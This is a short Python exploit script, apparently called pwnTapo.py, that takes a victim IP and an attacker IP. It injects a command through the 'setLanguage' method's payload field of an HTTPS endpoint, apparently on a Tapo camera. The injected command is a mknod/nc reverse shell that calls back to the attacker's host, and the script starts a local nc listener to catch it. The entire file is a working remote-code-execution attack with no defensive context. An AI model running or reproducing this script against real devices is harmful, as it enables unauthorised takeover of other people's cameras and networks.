#!/usr/bin/env python
# -*- coding:utf-8 -*-

import os
import requests
import sys
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# nc command to receive reverse shell (change it depending on your nc version)
PORT = 1337
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
NC_COMMAND = 'nc -lv %d' % PORT

if len(sys.argv) < 3:
    print("Usage: python3 pwnTapo.py <victim_ip> <attacker_ip>")
    exit()

victim = sys.argv[1]
attacker = sys.argv[2]

print("[+] Listening on %d" % PORT)
t = threading.Thread(target=os.system, args=(NC_COMMAND,))
t.start()

print("[+] Serving payload to %s\n" % victim)
url = "https://" + victim + ":443/"
json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
requests.post(url, json=json, verify=False)